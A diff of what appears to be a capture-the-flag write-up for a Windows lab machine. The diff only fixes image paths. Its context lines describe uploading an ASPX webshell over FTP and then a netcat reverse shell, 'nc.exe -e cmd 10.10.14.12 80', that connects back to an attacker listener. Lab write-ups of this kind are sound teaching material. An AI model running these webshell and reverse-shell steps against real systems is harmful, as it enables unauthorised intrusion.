@@ -54,7 +54,7 @@ local: /usr/share/webshells/aspx/cmdasp.aspx remote: cmd.aspx
 
 On port 80, let's try and visit this page and see what happens, if we look at the screenshot below, we've got a command box, that's good! That means our webshell uploaded correctly as expected.
 
-![asp web-shell](LinxzFade.github.io\assets\images\2019-05-25-Devel\Screenshot-2019-5-25.png)
+![asp web-shell](/assets/images/2019-05-25-Devel/Screenshot-2019-5-25.png)
 
 Now that we know that works, lets try and use this to execute a netcat.exe, we know that we can upload and it's going into the web root folder so this should allow us to leverage this in order to get a reverse shell on the device.
 
@@ -75,7 +75,7 @@ local: /usr/share/windows-binaries/nc.exe remote: nc.exe
 
 We didn't actually test our webshell yet so let's run a simple `whoami` in the shell and press execute, as you can see in the below screenshot `iis apppool\web` is returned so we know that our webshell for sure works and we know that the webserver is not running as system at least (that'd be a major sysadmin fail).
 
-![asp webshell execution](LinxzFade.github.io/assets/images/2019-05-25-Devel/webshell-execution.png)
+![asp webshell execution](/assets/images/2019-05-25-Devel/webshell-execution.png)
 
 So as you can see, we've got basic execution, now what we're going to do is get the web server to execute netcat for our reverse shell, let's first set a listener up on port 80 with `nc -nvlp 80`. We're now going to use our remote code execution to find the full path for the netcat.exe that we uploaded. We can do this using the `dir` command - `dir /s/b C:\ | find /i "nc.exe` it turns out it is located at `C:\inetpub\wwwroot\nc.exe` in order to execute this then we're just going to run `C:\inetpub\wwwroot\nc.exe -e cmd 10.10.14.12 80` which will give us a connection back to our listener, we've now got a login. I did initially try and get to the `user.txt` flag however because I was only a service account I did not have access this meant we need to priv-esc.
 
